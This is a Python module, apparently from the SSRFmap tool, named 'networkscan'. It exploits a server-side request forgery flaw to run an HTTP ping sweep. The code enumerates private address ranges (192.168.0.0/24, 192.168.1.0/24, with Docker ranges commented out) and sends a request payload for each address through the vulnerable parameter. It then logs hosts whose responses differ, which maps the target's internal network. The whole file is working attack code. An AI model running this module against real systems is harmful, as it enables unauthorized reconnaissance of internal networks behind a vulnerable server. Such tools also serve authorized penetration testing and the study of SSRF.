from ssrfmap.core.utils import *
from datetime import datetime
import sys, struct, socket
import logging
import concurrent.futures

name          = "networkscan"
description   = "Scan the network - HTTP Ping sweep"
author        = "Swissky"
documentation = []

class exploit():
    ips = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # concurrent requests in order to limit the time
        self.add_range("192.168.1.0/24")  # Default network 
        self.add_range("192.168.0.0/24")  # Default network 

        # Uncomment these lines if you need to scan more networks
        # self.add_range("172.17.0.0/16")   # Docker network
        # self.add_range("172.18.0.0/16")   # Docker network
        


        r = requester.do_request(args.param, "")
        with concurrent.futures.ThreadPoolExecutor(max_workers=None) as executor:
            future_to_url = {executor.submit(self.concurrent_request, requester, args.param, ip, "80", r): ip for ip in self.ips}


    def add_range(self, ip_cidr):
        (ip, cidr) = ip_cidr.split('/')
        cidr = int(cidr) 
        host_bits = 32 - cidr
        i = struct.unpack('>I', socket.inet_aton(ip))[0] # note the endianness
        start = (i >> host_bits) << host_bits # clear the host bits
        end = start | ((1 << host_bits) - 1)

        # excludes the first and last address in the subnet
        for i in range(start, end):
            self.ips.add(socket.inet_ntoa(struct.pack('>I',i)))


    def concurrent_request(self, requester, param, host, port, compare):
        try:
            payload = wrapper_http("", host, port.strip())
            r = requester.do_request(param, payload)
        
            if (not "Connection refused" in r.text) and (r.text != compare.text):
                timer = datetime.today().time().replace(microsecond=0)
                logging.info("\t[{}] Found host :{}".format(timer, host+ " "*40))

            timer = datetime.today().time().replace(microsecond=0)
        except Exception as e:
            pass